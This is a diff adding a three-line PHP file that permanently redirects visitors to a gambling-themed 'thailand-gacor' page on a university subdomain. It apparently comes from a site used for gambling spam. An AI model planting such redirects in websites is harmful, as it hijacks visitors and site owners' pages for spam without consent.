@@ -1,0 +1,3 @@
+<?php
+
+header('Location: https://ppc.president.ac.id/shop/thailand-gacor/', true, 301);
